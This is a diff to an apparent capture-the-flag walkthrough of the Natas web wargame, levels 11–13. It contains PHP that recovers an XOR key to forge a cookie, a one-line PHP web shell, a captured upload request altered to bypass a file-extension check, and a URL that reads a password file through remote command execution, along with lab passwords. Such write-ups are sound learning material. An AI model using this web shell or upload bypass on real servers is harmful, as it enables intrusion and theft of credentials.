@@ -245,3 +245,123 @@ if(array_key_exists("bgcolor",$_REQUEST)) {
 saveData($data);
 ?>
 ```
+First thing to do is determine what the key is. This is easily accomplished because when XOR'ing you can determine what the third compenent is if you have the other two. So...<br>
+plaintext ^ key = ciphertext<br>is equal to<br>plaintext ^ ciphertext = key<br>or<br>ciphertext ^ key = plaintext.<br>
+I write my own php code to solve this:
+```php
+<?php
+
+function xor_encrypt($in) {
+    $plain_text = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+    $encrypted_text = $in;
+    $key = '';
+
+    // Iterate through each character
+    for($i=0; $i < strlen($encrypted_text); $i++) {
+        $key .= $plain_text[$i] ^ $encrypted_text[$i % strlen($encrypted_text)];
+    }
+
+    return $key;
+}
+
+$encoded_data = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
+$encoded_data = base64_decode($encoded_data);
+$encoded_data = xor_encrypt($encoded_data);
+echo $encoded_data;
+?>
+``` 
+Which echos out: <b>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</b>. Making our key: <b>w8Jq</b><br>
+Next I need to change create the cookie with "showpassword=yes" rather than "showpassword=no". This'll (hypothetically) make the password show. Making $key='w8Jq' and setting "showpassword=yes" yields: <b>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</b><br>Using this for the data cookie yields the password for the next stage.<br>
+## natas12
+```
+natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+```
+Source code for the page:
+```php
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";    
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+```
+From examinig the code, this appears to be a file upload vulnerability. A path and filename are both given, thus we are able to execute whatever file is uploaded to the server. I create a small file which yields a webshell:
+```php
+<?php
+    system($_GET["cmd"]);
+?>
+```
+Everytime I upload this file though, the extension gets changed into a .jpg. I open BurpSuite and capture the HTTP POST request. 
+```
+POST /index.php HTTP/1.1
+Host: natas12.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------364886043538294662382913278575
+Content-Length: 521
+Origin: http://natas12.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
+Connection: close
+Referer: http://natas12.natas.labs.overthewire.org/
+Cookie: __utma=176859643.359785852.1644174450.1644174450.1644174450.1; __utmz=176859643.1644174450.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
+Upgrade-Insecure-Requests: 1
+
+-----------------------------364886043538294662382913278575
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------364886043538294662382913278575
+Content-Disposition: form-data; name="filename"
+
+tescipab3s.jpg
+-----------------------------364886043538294662382913278575
+Content-Disposition: form-data; name="uploadedfile"; filename="readme.php"
+Content-Type: application/x-php
+
+<?php system($_GET["cmd"]); ?>
+
+-----------------------------364886043538294662382913278575--
+```
+I change the tescipab3s.jpg to tescipab3s.php which seems to circumvent the issue. Navigating this this location and using: <b>http://natas12.natas.labs.overthewire.org/upload/tescipab3s.php?cmd=[COMMAND]</b> give me RCE. I can then display the password for the next level using: <b>http://natas12.natas.labs.overthewire.org/upload/n9tb0zl0l7.php?cmd=cat%20/etc/natas_webpass/natas13</b>
+
+## natas13
+```
+natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+```
